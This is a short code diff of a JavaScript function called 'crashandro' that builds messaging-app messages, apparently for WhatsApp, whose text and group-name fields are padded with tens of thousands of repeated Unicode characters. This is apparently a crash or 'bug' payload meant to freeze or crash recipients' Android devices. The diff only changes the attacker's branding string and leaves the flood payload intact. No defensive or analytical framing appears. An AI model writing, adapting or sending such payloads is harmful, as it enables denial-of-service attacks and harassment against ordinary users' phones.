@@ -798,7 +798,7 @@ async function crashandro(client, X) {
         message: {
           interactiveMessage: {
             body: {
-              ٖtext: "" +
+              text: "🦠</🧬⃟༑⌁𝗫 𝗜 𝗡 𝗦 𝗢 𝗢" +
               "ꦽ".repeat(25000) +
               "ោ៝".repeat(20000) +
               "@5".repeat(50000),
@@ -851,7 +851,7 @@ async function crashandro(client, X) {
             groupJid: "13535516@g.us",
             inviteCode: "XxX",
             inviteExpiration: "1",
-            groupName: "🦠</🧬⃟༑⌁𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗘𝗥" +
+            groupName: "🦠</🧬⃟༑⌁𝗫 𝗜 𝗡 𝗦 𝗢 𝗢" +
               "ꦽ".repeat(25000) +
               "ោ៝".repeat(20000) +
               "@5".repeat(50000),
